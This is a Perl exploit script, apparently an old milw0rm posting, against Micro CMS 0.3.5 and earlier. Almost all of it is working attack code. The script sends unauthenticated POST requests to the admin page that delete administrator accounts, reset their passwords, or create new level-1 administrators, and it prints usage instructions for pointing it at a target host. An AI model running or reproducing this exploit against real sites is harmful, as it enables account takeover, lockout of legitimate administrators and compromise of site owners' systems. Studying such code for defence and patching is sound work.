#!/usr/bin/perl
# --------------------------------------------------------------
# Micro CMS <= 0.3.5 Remote (Add/Delete/Password Change) Exploit
# StAkeR[at]hotmail[dot]it
# http://www.impliedbydesign.com/apps/microcms/microcms.zip
# --------------------------------------------------------------

use strict;
use LWP::UserAgent;

my ($admin,$passwd);
my @real = undef;
my $http = new LWP::UserAgent; 
my ($host,$path,$tell) = @ARGV;

if($host !~ /http:\/\/(.+?)$/i || $tell !~ /^\-(delete|change|add)?$/i)
{
  print STDOUT "[+] Micro CMS <= 0.3.5 Remote (Add/Delete/Password Change) Exploit\n";
  print STDOUT "[+] Usage: perl $0 http://[host] [path] -option (-delete,-change,-add)\n";
  exit;
}


if($tell =~ /delete/i)
{
  print STDOUT "[+]Admin ID: ";
  chomp($admin = <STDIN>);
  
  if(defined $admin)
  {
    print STDOUT del_admin($admin);
    exit;
  }
  else
  {
    print STDOUT "[+] Not Defined!\n";
    exit;
  }
}

if($tell =~ /change/i)
{
  print STDOUT "[+] Admin ID : ";
  chomp($admin = <STDIN>);
  
  print STDOUT "[+] New Password: ";
  chomp($passwd = <STDIN>);
  
  if(defined $admin || defined($passwd))
  {
    print STDOUT change_pwd($admin,$passwd);
  }
  else
  {
    print STDOUT "[+] Not Defined!\n";
  }
}

if($tell =~ /add/i)
{
  print STDOUT "[+] Admin Username: ";
  chomp($admin = <STDIN>);
  
  print STDOUT "[+] Admin Password: ";
  chomp($passwd = <STDIN>);
  
  if(defined $admin || defined($passwd))
  {
    print STDOUT add_admin($admin,$passwd);
  }
  else
  {
    print STDOUT "[+] Not Defined!\n";
  }
}


sub change_pwd
{
  my ($userid,$passwd) = @_;
 
  my $post = {
               action                  => 'change_password',
               administrators_id       => $userid,
               administrators_password => $passwd,
            };
          
  $http->post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return "[+] Password Changed! ($passwd)\n";

}


sub del_admin
{
  my $userid = shift @_;
 
  my $post = {
               action                  => 'delete_admin',
               administrators_id       => $userid,
            };
          
  $http->post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return "[+] Admin ($userid) Has Been Deleted!\n";

}


sub add_admin
{
  my ($username,$password) = @_;
  my $level = 1;
 
  my $post = {
               action                  => 'add_admin',
               administrators_name     => $username,
               administrators_username => $username,
               administrators_password => $password,
               administrators_email    => $username,
               administrators_level    => $level,
            };
          
  $http->post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return "[+] Username: $username and Password: $password\n";
}    

# milw0rm.com [2008-11-01]
